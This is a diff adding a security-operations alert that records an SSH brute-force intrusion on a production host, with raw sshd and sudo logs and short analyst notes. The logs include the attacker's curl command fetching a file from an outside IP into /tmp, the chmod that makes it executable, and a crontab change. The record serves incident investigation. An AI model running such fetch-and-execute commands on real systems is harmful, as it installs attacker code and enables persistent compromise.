@@ -1,0 +1,16 @@
+Alert: SOC-4471 — Multiple failed SSH logins followed by successful auth on prod-web-03
+
+Jan 14 02:11:03 prod-web-03 sshd[8891]: Failed password for invalid user admin from 91.219.236.18 port 51422 ssh2
+Jan 14 02:11:07 prod-web-03 sshd[8891]: Failed password for invalid user admin from 91.219.236.18 port 51423 ssh2
+Jan 14 02:11:12 prod-web-03 sshd[8892]: Failed password for root from 91.219.236.18 port 51430 ssh2
+Jan 14 02:11:19 prod-web-03 sshd[8893]: Failed password for root from 91.219.236.18 port 51441 ssh2
+Jan 14 02:11:26 prod-web-03 sshd[8894]: Failed password for root from 91.219.236.18 port 51450 ssh2
+Jan 14 02:12:03 prod-web-03 sshd[8901]: Accepted password for root from 91.219.236.18 port 51488 ssh2
+Jan 14 02:13:41 prod-web-03 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/upd http://45.148.10.94/update.php
+Jan 14 02:14:02 prod-web-03 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/upd
+Jan 14 02:15:10 prod-web-03 crontab[9012]: (root) REPLACE (root)
+
+Analyst notes: the source IP 91.219.236.18 also shows up in our OSINT feed
+for repeated SSH brute-force activity. The downloaded file's hash was
+e99a18c428cb38d5f260853678922e03. Payload beaconed back to
+http://45.148.10.94/update.php shortly after execution.
